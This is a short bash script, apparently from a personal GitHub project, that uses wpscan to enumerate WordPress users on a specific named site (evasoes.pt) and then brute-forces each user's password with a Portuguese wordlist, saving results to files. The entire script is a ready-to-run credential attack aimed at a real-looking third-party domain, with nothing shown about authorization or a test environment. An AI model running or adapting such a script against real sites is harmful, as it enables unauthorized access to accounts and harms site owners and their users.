#!/bin/bash

# Author: meepmaster
# Date: 06-04-2024
# Description: WPSCAN SCRIPT SIMPLE



# Perform user enumeration

function user_enumeration () {
    echo "Performing user enumeration..."
    wpscan --url https://www.evasoes.pt/  --enumerate u > user_enum.txt
    # Extract usernames from the user enumeration result
    USERLIST=$(grep 'Username:' user_enum.txt | awk '{print $2}')
} 


# Perform brute force attack for each username

function force_brute () {
        for USERNAME in $USERLIST; do
        echo "Performing brute force attack for user: $USERNAME..."
        wpscan --url https://www.evasoes.pt/  --passwords "/home/meepmaster/scripts/github/wpscanmeepscript/wordlist/portuguese_a-z_-_no_special_chars.txt" --user "$USERNAME"  --output "brute_force_result_$USERNAME.txt"
    done
}

# Call Functions

user_enumeration
force_brute

# End of Script